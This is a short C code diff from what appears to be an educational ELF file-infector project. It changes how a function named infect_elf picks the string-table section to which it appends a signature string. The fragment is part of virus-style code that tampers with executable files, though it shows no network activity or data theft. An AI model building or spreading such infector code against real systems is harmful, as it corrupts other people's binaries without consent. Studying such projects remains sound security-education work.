@@ -19,9 +19,12 @@ void	infect_elf(char *file_path)
 	elf = read_elf(file_path);
 	if (elf == NULL)
 		return ;
-	t_section *section = elf->get_section(elf, ".strtab");
+	int size = elf->get_nbr_sections(elf->sections);
+	int strtab_index = elf->get_index_section(elf, ".strtab");
+	int shstrtab_index = elf->get_index_section(elf, ".shstrtab");
+	t_section *section = elf->get_section_by_index(elf, size);
 
-	if (section != NULL || (section = elf->get_section(elf, ".shstrtab")) != NULL) {
+	if (section != NULL && (strtab_index == size || shstrtab_index == size)) {
 		char *content = malloc(section->data->sh_size + 16);
 		memcpy(content, section->content, section->data->sh_size);
 		memcpy(content + section->data->sh_size, "jguyet-frmarinh", 15);
